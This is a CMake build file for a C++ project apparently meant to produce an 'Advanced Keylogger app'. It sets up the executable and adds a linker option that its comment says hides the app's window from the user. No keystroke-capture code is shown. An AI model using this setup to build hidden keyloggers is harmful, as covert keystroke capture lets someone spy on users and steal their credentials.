# ./app/CMakeLists.txt

project(KeyloggerAPP
        VERSION 1.0.0
        DESCRIPTION "Advanced Keylogger app."
)



add_executable(Keylogger main.cpp)

# 'include' is variable in 'add_library' function in ./include/CMakeLists.txt
target_link_libraries(Keylogger PRIVATE include)

# Add -mwindows in executable to stop app window popping up or hide window
target_link_options(Keylogger BEFORE PRIVATE "-mwindows")
